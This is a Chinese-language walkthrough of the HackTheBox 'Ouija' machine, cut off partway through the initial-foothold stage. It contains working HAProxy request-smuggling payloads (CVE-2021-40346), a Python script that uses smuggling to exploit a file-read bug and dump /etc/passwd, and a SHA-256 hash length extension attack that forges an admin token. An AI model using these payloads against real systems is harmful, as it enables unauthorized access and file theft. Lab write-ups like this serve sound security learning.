# 概述

​		首先在枚举80口的HTTP服务的web子目录的时候发现了站点的域名ouija.htb，然后枚举子域名。访问http://ouija.htb的时候发现加载了gitea.ouija.htb的资源，即发现了一个子域名。在gitea.ouija.htb中发现了一个HTTP走私请求的漏洞，利用他来走私访问dev.ouija.htb，会找到一个LFI漏洞。仔细枚举3000口的web服务，然后能再次找到一个LFI。之后利用hash length extension attack攻击获取初始立足点。特权提升部分看[暗羽佬的wp](https://darkwing.moe/2023/12/05/Ouija-HackTheBox/)。



# 01、基础信息收集

## 1.1 端口扫描

1. 全TCP端口扫描

   ```
   └─# nmap -sS -Pn 10.10.11.244 --min-rate 10000 -oN TCP_Port.txt
   
   PORT     STATE SERVICE
   22/tcp   open  ssh
   80/tcp   open  http
   3000/tcp open  ppp
   ```

2. 全UDP端口扫描

   ```
   └─# nmap -sU -p- -Pn 10.10.11.244 --min-rate 10000 -oN UDP_Port.txt
   ```

3. 存活端口详细信息扫描

   ```
   └─# nmap -sV -sC -Pn -p22,80,3000 10.10.11.244 --min-rate 10000 -oN Port_server.txt
   
   PORT     STATE SERVICE VERSION
   22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   256 6ff2b4ed1a918d6ec9105171d57c49bb (ECDSA)
   |_  256 dfddbcdc570d98af0f882f73334862e8 (ED25519)
   
   80/tcp   open  http    Apache httpd 2.4.52
   |_http-title: Apache2 Ubuntu Default Page: It works
   |_http-server-header: Apache/2.4.52 (Ubuntu)
   3000/tcp open  http    Node.js Express framework
   |_http-title: Site doesn't have a title (application/json; charset=utf-8).
   Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
   ```

   目标机器是Ubuntu。



## 1.2 TCP 80 HTTP

1. 指纹识别

   ```
   └─# whatweb http://10.10.11.244/     
   http://10.10.11.244/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.244], Title[Apache2 Ubuntu Default Page: It works]
   ```

   web服务器是apache 2.4.52，运行的是默认的Ubuntu上Apache2服务。

   google检索apache 2.4.52 能找到一个[2.4.50的RCE](https://www.exploit-db.com/exploits/50406)，这边简单测试了一下不可行。

   

2. 枚举web子目录

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.244 -t 50 --no-error 
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://10.10.11.244
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.6
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /.htpasswd            (Status: 403) [Size: 279]
   /.hta                 (Status: 403) [Size: 279]
   /.htaccess            (Status: 403) [Size: 279]
   /index.html           (Status: 200) [Size: 10671]
   /index.php            (Status: 302) [Size: 0] [--> http://ouija.htb/]
   /server-status        (Status: 200) [Size: 12989]
   Progress: 4723 / 4724 (99.98%)
   ===============================================================
   Finished
   ===============================================================
   ```

   目标站点使用的语言是php，然后有一个ouija.htb域名。该域名也能在/server-status下找到。

   

   访问http://ouija.htb，发现它发送了http://gitea.ouija.htb/leila/ouija-htb/js/tracking.js?_=0183747482的GET请求

   ![image-20231206163041023](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072317259.png)

   将gitea.ouija.htb添加到/etc/hosts中

   ![image-20231206163158131](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318265.png)

   枚举http://ouija.htb下的web子目录

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://ouija.htb/ -t 50 -x php --no-error
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://ouija.htb/
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.6
   [+] Extensions:              php
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /.hta                 (Status: 403) [Size: 274]
   /.htaccess            (Status: 403) [Size: 274]
   /.htaccess.php        (Status: 403) [Size: 274]
   /.htpasswd.php        (Status: 403) [Size: 274]
   /.htpasswd            (Status: 403) [Size: 274]
   /.hta.php             (Status: 403) [Size: 274]
   /admin                (Status: 301) [Size: 306] [--> http://ouija.htb/admin/]
   /css                  (Status: 301) [Size: 304] [--> http://ouija.htb/css/]
   /img                  (Status: 301) [Size: 304] [--> http://ouija.htb/img/]
   /index.html           (Status: 200) [Size: 18017]
   /js                   (Status: 301) [Size: 303] [--> http://ouija.htb/js/]
   /lib                  (Status: 301) [Size: 304] [--> http://ouija.htb/lib/]
   /server-status        (Status: 200) [Size: 21571]
   Progress: 9446 / 9448 (99.98%)
   ===============================================================
   Finished
   ===============================================================
   ```

   访问/admin的响应是403。

   

3. 枚举一下子域名，从结果来看似乎dev开头的都可行，但是拿了几个子域名测试都是403的状态码。

   ```
   └─# wfuzz -u http://10.10.11.244 -H "Host: FUZZ.ouija.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw=961
   ********************************************************
   * Wfuzz 3.1.0 - The Web Fuzzer                         *
   ********************************************************
   
   Target: http://10.10.11.244/
   Total requests: 19966
   
   =====================================================================
   ID           Response   Lines    Word       Chars       Payload                                                                                    
   =====================================================================
   
   000000019:   403        3 L      8 W        93 Ch       "dev"                                                                                      
   000000171:   403        3 L      8 W        93 Ch       "dev2"                                                                                     
   000000302:   403        3 L      8 W        93 Ch       "devel"                                                                                    
   000000341:   403        3 L      8 W        93 Ch       "development"                                                                              
   000000466:   403        3 L      8 W        93 Ch       "dev1"                                                                                     
   000000612:   403        3 L      8 W        93 Ch       "develop"                                                                                  
   000000643:   403        3 L      8 W        93 Ch       "dev3"                                                                                     
   000000804:   403        3 L      8 W        93 Ch       "developer"                                                                                
   000001492:   403        3 L      8 W        93 Ch       "dev01"                                                                                    
   000001629:   403        3 L      8 W        93 Ch       "dev4"                                                                                     
   000002341:   403        3 L      8 W        93 Ch       "developers"                                                                               
   000002440:   403        3 L      8 W        93 Ch       "dev5"                                                                                     
   000003044:   403        3 L      8 W        93 Ch       "devtest"                                                                                  
   000003662:   403        3 L      8 W        93 Ch       "dev-www"                                                                                  
   000003808:   403        3 L      8 W        93 Ch       "devil"                                                                                    
   000004275:   403        3 L      8 W        93 Ch       "dev.m"                                                                                    
   000006315:   403        3 L      8 W        93 Ch       "devadmin"                                                                                 
   000006563:   403        3 L      8 W        93 Ch       "dev6"                                                                                     
   000006609:   403        3 L      8 W        93 Ch       "dev7"                                                                                     
   000006672:   403        3 L      8 W        93 Ch       "dev.www"                                                                                  
   000007221:   403        3 L      8 W        93 Ch       "devserver"                                                                                
   000007278:   403        3 L      8 W        93 Ch       "devapi"                                                                                   
   000007514:   403        3 L      8 W        93 Ch       "devdb"                                                                                    
   000007787:   403        3 L      8 W        93 Ch       "devsite"                                                                                  
   000007800:   403        3 L      8 W        93 Ch       "devwww"                                                                                   
   000008016:   403        3 L      8 W        93 Ch       "devel2"                                                                                   
   000007998:   403        3 L      8 W        93 Ch       "dev-api"                                                                                  
   000008506:   403        3 L      8 W        93 Ch       "devblog"                                                                                  
   000008974:   403        3 L      8 W        93 Ch       "devon"                                                                                    
   000009532:   400        10 L     35 W       303 Ch      "#www"                                                                                     
   000009860:   403        3 L      8 W        93 Ch       "devmail"                                                                                  
   000010407:   403        3 L      8 W        93 Ch       "devcms"                                                                                   
   000010507:   403        3 L      8 W        93 Ch       "dev10"                                                                                    
   000010581:   400        10 L     35 W       303 Ch      "#mail"                                                                                    
   000012132:   403        3 L      8 W        93 Ch       "dev.admin"                                                                                
   000012470:   403        3 L      8 W        93 Ch       "dev.shop"                                                                                 
   000013384:   403        3 L      8 W        93 Ch       "dev0"                                                                                     
   000015139:   403        3 L      8 W        93 Ch       "dev02"                                                                                    
   000016131:   403        3 L      8 W        93 Ch       "deva"                                                                                     
   000016178:   403        3 L      8 W        93 Ch       "devils"                                                                                   
   000017051:   403        3 L      8 W        93 Ch       "devsecure"  
   ```



## 1.3 TCP 3000 HTTP

1. 简单的指纹识别

   ```
   └─# whatweb http://10.10.11.244:3000                                                                                                     
   http://10.10.11.244:3000 [200 OK] Country[RESERVED][ZZ], IP[10.10.11.244], X-Powered-By[Express]
   ```

   在url中访问的情况如下

   ![image-20231206162332711](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318517.png)



2. 枚举web子目录

   ```
   ┌──(root㉿kali)-[/tmp]
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://ouija.htb:3000/ -t 50 --no-error --exclude-length 31
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://ouija.htb:3000/
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
   [+] Negative Status codes:   404
   [+] Exclude Length:          31
   [+] User Agent:              gobuster/3.6
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /Login                (Status: 200) [Size: 42]
   /login                (Status: 200) [Size: 42]
   /register             (Status: 200) [Size: 26]
   /users                (Status: 200) [Size: 25]
   Progress: 4723 / 4724 (99.98%)
   ===============================================================
   Finished
   ===============================================================
   ```

3. /login

   需要uname和upass

   ![image-20231206163350985](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318979.png)

   尝试admin:admin，结果如下

   ![image-20231206164928384](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318101.png)

4. /register

   ![image-20231206165100344](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318306.png)

5. /users

   直接访问提示缺少ihash标头

   ![image-20231206165139637](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318846.png)

   添加了ihash标头后缺少identification标头

   ![image-20231206165237082](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318994.png)

   再次添加对应的标头，这次得到的是Invalid Token

   ![image-20231206165330051](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318371.png)

​		3000端口的服务暂时搁置。



## 1.4 gitea.ouija.htb

1. 可以直接访问http://gitea.ouija.htb,然后点击左上角的**探索**，可以直接访问ouija-htb

   README.md中给出了Ouija 网站设置和产品信息

   ![image-20231206165911831](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072318419.png)

2. 依次检索Instructions清单中的服务，寻找已知的公告漏洞。

   通过google检索发现HA-Proxy容易存在[HTTP请求走私漏洞](https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks)。该漏洞已在 HAProxy 版本 2.0.25、2.2.17、2.3.14 和 2.4.4 中通过添加名称和值长度的大小检查进行修复。目标机器的2.2.16版本似乎并没有修复。



3. payload来自于alexOarga的[CVE-2021-40346](https://github.com/alexOarga/CVE-2021-40346/blob/main/payload)

   ```
   POST /index HTTP/1.1
   Host: xx.xxxxx.xx:8000
   Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
   Content-Length: 23
   
   GET /admin HTTP/1.1
   h: GET /index HTTP/1.1
   Host: xx.xxxxx.xx:8000
   ```

   

   尝试利用http走私访问http://ouija.htb/admin,

   ```
   POST /index HTTP/1.1
   
   Host: ouija.htb
   
   Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
   
   Content-Length: 39
   
   
   
   GET http://ouija.htb/admin HTTP/1.1
   
   X: GET / HTTP/1.1
   
   Host: ouija.htb
   
   
   ```

   上述请求发送两次，但是访问失败。

   ![image-20231206173513942](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072319438.png)

   

   尝试利用http走私访问http://dev.ouija.htb/

   ```
   POST /index HTTP/1.1
   
   Host: ouija.htb
   
   Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
   
   Content-Length: 39
   
   
   
   GET http://dev.ouija.htb/ HTTP/1.1
   
   X: GET / HTTP/1.1
   
   Host: ouija.htb
   
   
   ```

   上述请求发送两次，如果得不到下图结果需要多测试几次

   ![image-20231206175410838](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072319556.png)

   可以看到http://dev.ouija.htb下有一个editor.php文件，从file参数来看可以测试一下LFI，

   

4. `http://dev.ouija.htb/editor.php`处的LFI漏洞

   测试http://dev.ouija.htb/editor.php?file= 这边的file参数，它较为容易存在LFI漏洞。

   一个简单的python脚本帮助枚举`../`个数

   ```
   import socket
   import sys
   import re
   
   if len(sys.argv) < 2:
       print("missing file param")
       sys.exit()
   
   file = sys.argv[1]
   
   # Calculate Content-Length
   cl = len("GET http://dev.ouija.htb/editor.php?file=%s HTTP/1.1\r\nh:" % file)
   
   # Construct the payload
   payload = f"""POST / HTTP/1.1\r\nHost: ouija.htb\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length: {cl}\r\n\r\nGET http://dev.ouija.htb/editor.php?file={file} HTTP/1.1\r\nh:GET / HTTP/1.1\r\nHost: ouija.htb\r\n\r\n"""
   
   # Target host and port
   target_host = 'ouija.htb'
   target_port = 80
   
   # Create a socket object
   client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # Connect to the target
   client.connect((target_host, target_port))
   
   # Send data
   client.send(payload.encode('utf-8'))
   
   # Receive data in a loop
   response = b''
   while True:
       chunk = client.recv(4096)
       if not chunk:
           break
       response += chunk
       
   #There is an error in using the following statement to receive the result
   #response = client.recv(9999999)
   
   # Print the response
   #print(response.decode('utf-8'))
   
   output = re.search(r'<textarea name="content" id="content" cols="30" rows="10">([\s\S]*?)<\/textarea>', response.decode('utf-8'))
   
   if output:
       extracted_content = output.group(1)
       print(extracted_content)
   else:
       print("No match found.")
   
   # Close the connection
   client.close()
   ```

   测试后确定LFI的利用方式如下

   ```
   ┌──(root㉿kali)-[/tmp]
   └─# python exploit.py ../../../../../../etc/passwd
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   sync:x:4:65534:sync:/bin:/bin/sync
   games:x:5:60:games:/usr/games:/usr/sbin/nologin
   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
   irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
   _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
   ```

   

   确定存在LFI，但是读取的/etc/passwd中没有发现除root外可以用来登录的用户。

   我有尝试过日志投毒的方式，但是这边测试无法正确输出对应的日志内容。

   

5. 来查看一下`http://dev.ouija.htb/editor.php`调用的两个文件

   利用走私请求来查看init.sh中的内容

   ```
   POST /index.html HTTP/1.1
   
   Host: ouija.htb
   
   Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
   
   Content-Length: 62
   
   
   
   GET http://dev.ouija.htb/editor.php?file=init.sh HTTP/1.1
   
   X: GET / HTTP/1.1
   
   Host: ouija.htb
   
   
   ```

   上述请求发送两次，然后得到init.sh中的内容

   ```sh
   #!/bin/bash
   
   echo "$(date) api config starts" >>
   mkdir -p .config/bin .config/local .config/share /var/log/zapi
   export k=$(cat /opt/auth/api.key)
   export botauth_id="bot1:bot"
   export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
   ln -s /proc .config/bin/process_informations
   echo "$(date) api config done" >> /var/log/zapi/api.log
   
   exit 1
   ```

   ①`mkdir -p .config/bin .config/local .config/share /var/log/zapi` ：此命令创建多个目录（如果它们尚不存在）。 `-p` 选项确保根据需要创建父目录。

   ② `export k=$(cat /opt/auth/api.key)` ：此行读取文件 `/opt/auth/api.key` 的内容并将其分配给变量 `k` 。 `export` 命令使该变量可供子进程使用。

   ③ `export botauth_id="bot1:bot"` ：此行将环境变量 `botauth_id` 设置为字符串“bot1:bot”。

   ④ `export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"` ：此行将环境变量 `hash` 设置为特定值。

   ⑤`ln -s /proc .config/bin/process_informations` ：此命令在目录 `.config/bin` 中创建一个名为 `process_informations` 的符号链接，该链接指向 `/proc` 目录。

   

   猜测bot1可能是目标机器上的用户，然后bot是密码，尝试通过ssh链接，失败。

   尝试破解该hash，猜测它是用户的密码，失败。

   ```
   └─# hashid 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1
   Analyzing '4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1'
   [+] Snefru-256 
   [+] SHA-256 
   [+] RIPEMD-256 
   [+] Haval-256 
   [+] GOST R 34.11-94 
   [+] GOST CryptoPro S-Box 
   [+] SHA3-256 
   [+] Skein-256 
   [+] Skein-512(256) 
   
   └─# john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   ```

   

   利用http请求走私来查看app.js

   ```
   POST /index.html HTTP/1.1
   
   Host: ouija.htb
   
   Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
   
   Content-Length: 61
   
   
   
   GET http://dev.ouija.htb/editor.php?file=app.js HTTP/1.1
   
   X: GET / HTTP/1.1
   
   Host: ouija.htb
   
   
   ```

   app.js中的内容，此 Node.js 脚本使用 Express.js 框架定义一个简单的 Web 服务器，其中包含用于处理 HTTP 请求的各种路由。

   ```js
   // express ：Node.js 的流行 Web 框架。
   var express = require('express');
   var app = express();
   // crypto ：用于加密函数的 Node.js 内置模块。
   var crt = require('crypto');
   // base85 ：用于Base85编码和解码数据的模块。
   var b85 = require('base85');
   // fs ：用于文件系统操作的 Node.js 内置模块。
   var fs = require('fs');
   const key = process.env.k;
   
   //它创建一个 Express 应用程序并侦听端口 3000。
   app.listen(3000, ()=>{ console.log("listening @ 3000"); });
   
   //解码 Base64 编码的字符串，将其转换为小写，然后将其解释为十六进制字符串。结果被返回。
   function d(b){
       s1=(Buffer.from(b, 'base64')).toString('utf-8');
       s2=(Buffer.from(s1.toLowerCase(), 'hex'));
       return s2;
   }
   //根据密钥和标识字符串生成 SHA-256 哈希值。
   function generate_cookies(identification){
       var sha256=crt.createHash('sha256');
       wrap = sha256.update(key);
       wrap = sha256.update(identification);
       hash=sha256.digest('hex');
       return(hash);
   }
   //根据提供的哈希验证 generate_cookies 生成的哈希。如果匹配则返回 0，否则返回 1。
   function verify_cookies(identification, rhash){
       if( ((generate_cookies(d(identification)))) === rhash){
           return 0;
       }else{return 1;}
   }
   //中间件功能，用于检查身份验证标头的存在性和有效性。
   function ensure_auth(q, r) {
       if(!q.headers['ihash']) {
           r.json("ihash header is missing");
       }
       else if (!q.headers['identification']) {
           r.json("identification header is missing");
       }
   
       if(verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
           r.json("Invalid Token");
       }
       else if (!(d(q.headers['identification']).includes("::admin:True"))) {
           r.json("Insufficient Privileges");
       }
   }
   
   app.get("/login", (q,r,n) => {
       if(!q.query.uname || !q.query.upass){
           r.json({"message":"uname and upass are required"});
       }else{
           if(!q.query.uname || !q.query.upass){
               r.json({"message":"uname && upass are required"});
           }else{
               r.json({"message":"disabled (under dev)"});
           }
       }
   });
   app.get("/register", (q,r,n) => {r.json({"message":"__disabled__"});});
   app.get("/users", (q,r,n) => {
       ensure_auth(q, r);
       r.json({"message":"Database unavailable"});
   });
   
   //需要身份验证、读取指定文件并响应其内容的路由。它对文件路径执行一些基本检查以防止某些操作。
   app.get("/file/get",(q,r,n) => {
       ensure_auth(q, r);
       if(!q.query.file){
           r.json({"message":"?file= i required"});
       }else{
           let file = q.query.file;
           //防止目录遍历
           if(file.startsWith("/") || file.includes('..') || file.includes("../")){
               r.json({"message":"Action not allowed"});
           }else{
               fs.readFile(file, 'utf8', (e,d)=>{
                   if(e) {
                       r.json({"message":e});
                   }else{
                       r.json({"message":d});
                   }
               });
           }
       }
   });
   app.get("/file/upload", (q,r,n) =>{r.json({"message":"Disabled for security reasons"});});
   app.get("/*", (q,r,n) => {r.json("200 not found , redirect to .");});
   ```

   这里找到了http://ouija.htb:3000下的其他子目录，经验来看http://ouija.htb:3000/file/get?file= 这边也容易存在LFI漏洞，但是需要经过身份验证。

   

   首先分析一下验证机制

   ```js
   function ensure_auth(q, r) {
       // 检查 'ihash' header 是否丢失
       if (!q.headers['ihash']) {
           r.json("ihash header is missing");
       }
       // 检查 'identification' header 是否丢失
       else if (!q.headers['identification']) {
           r.json("identification header is missing");
       }
   
       // 通过将计算出的哈希值与提供的“ihash”进行比较来验证 cookie
       if (verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
           r.json("Invalid Token");
       }
       // 检查“identification”是否包含字符串“::admin:True”
       else if (!(d(q.headers['identification']).includes("::admin:True"))) {
           r.json("Insufficient Privileges");
       }
   }
   
   ```



# 02、获取初始立足点

## 2.1 Hash Length Extension Attack

1. 在init.sh中获取了一个hash散列`4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1`

   有一个`bot1:bot`的字符串。

   在app.js中得知identification中必须要有`::admin:True`字符串。

   

   想象一下，服务器通过将秘密附加到一些已知的明文数据然后对该数据进行散列来对一些数据进行签名。这边我们假设`4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1`是使用了secret对数据`bot1:bot`加密得到的，而secret来自于`opt/auth/api.key`。

   

   这里无法通过http走私http://dev.ouija.htb/editor.php?file=../../../../../../opt/auth/api.key来访问得到secret，访问不到

   ![image-20231206220435220](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072319446.png)

   这里可以尝试hash length extension attack，有关该技术的一些解释

   hash extension attack : https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack
   IPPSEC: https://youtu.be/qNsbf3EmLrA?t=6151
   一個很棒的原理：https://www.youtube.com/watch?v=uLSnwA10Qcc&t=29s

   

   该攻击的利用工具[hash_extender](https://github.com/iagox86/hash_extender)。编译的时候遇到的错误[解决方法](https://github.com/iagox86/hash_extender/pull/25/commits/62b681af5a86175147de69b473a2a066063461e4)。

   ```
   ┌──(root㉿kali)-[/tmp/hash_extender]
   └─# make
   [CC] hash_extender_engine.o
   [CC] test.o
   [CC] tiger.o
   [CC] util.o
   [LD] hash_extender
   [CC] hash_extender_test.o
   [LD] hash_extender_tes
   ```

   



2. 我们目前掌握的情况如下

   数据 `bot1:bot`

   签名 `4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1`

   追加数据 `::admin:True`

   哈希格式 `sha256`

   

   hash_extender的使用示例如下，在这里我们缺少secret的长度。

   ```
   $ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5
   ```

   

   可以通过`--secret-min`来指定最小长度，`--secret-max`来指定最大长度,先简单测试一下1~20的secret。

   ```
   ┌──(root㉿kali)-[~/TOOLS/hash_extender]
   └─# ./hash_extender --data 'bot1:bot' --signature 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 --append '::admin:True' --format sha256 --secret-min=1 --secret-max=20
   Type: sha256
   Secret length: 1
   New signature: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
   New string: 626f74313a626f74800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000483a3a61646d696e3a54727565
   
   Type: sha256
   Secret length: 2
   New signature: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
   New string: 626f74313a626f748000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000503a3a61646d696e3a54727565
   [snip]
   
   Type: sha256
   Secret length: 20
   New signature: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
   New string: 626f74313a626f748000000000000000000000000000000000000000000000000000000000000000000000e03a3a61646d696e3a54727565
   ```

   

   ```
   Type: sha256
   Secret length: 23
   New signature: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
   New string: 626f74313a626f748000000000000000000000000000000000000000000000000000000000000000f83a3a61646d696e3a54727565
   ```



3. 3000口的/file/get访问的时候需要经过身份验证，检验流程如下

   ```js
   //解码 Base64 编码的字符串，将其转换为小写，然后将其解释为十六进制字符串。结果被返回。
   function d(b){
       s1=(Buffer.from(b, 'base64')).toString('utf-8');
       s2=(Buffer.from(s1.toLowerCase(), 'hex'));
       return s2;
   }
   //根据密钥和标识字符串生成 SHA-256 哈希值。
   function generate_cookies(identification){
       var sha256=crt.createHash('sha256');
       wrap = sha256.update(key);
       wrap = sha256.update(identification);
       hash=sha256.digest('hex');
       return(hash);
   }
   //根据提供的哈希验证 generate_cookies 生成的哈希。如果匹配则返回 0，否则返回 1。
   function verify_cookies(identification, rhash){
       if( ((generate_cookies(d(identification)))) === rhash){
           return 0;
       }else{return 1;}
   }
   
   //中间件功能，用于检查身份验证标头的存在性和有效性。
   function ensure_auth(q, r) {
       // 检查 'ihash' header 是否丢失
       if (!q.headers['ihash']) {
           r.json("ihash header is missing");
       }
       // 检查 'identification' header 是否丢失
       else if (!q.headers['identification']) {
           r.json("identification header is missing");
       }
   
       // 通过将计算出的哈希值与提供的“ihash”进行比较来验证 cookie
       if (verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
           r.json("Invalid Token");
       }
       // 检查“identification”是否包含字符串“::admin:True”
       else if (!(d(q.headers['identification']).includes("::admin:True"))) {
           r.json("Insufficient Privileges");
       }
   }
   
   
   //需要身份验证、读取指定文件并响应其内容的路由。它对文件路径执行一些基本检查以防止某些操作。
   app.get("/file/get",(q,r,n) => {
       ensure_auth(q, r);
       if(!q.query.file){
           r.json({"message":"?file= i required"});
       }else{
           let file = q.query.file;
           //防止目录遍历
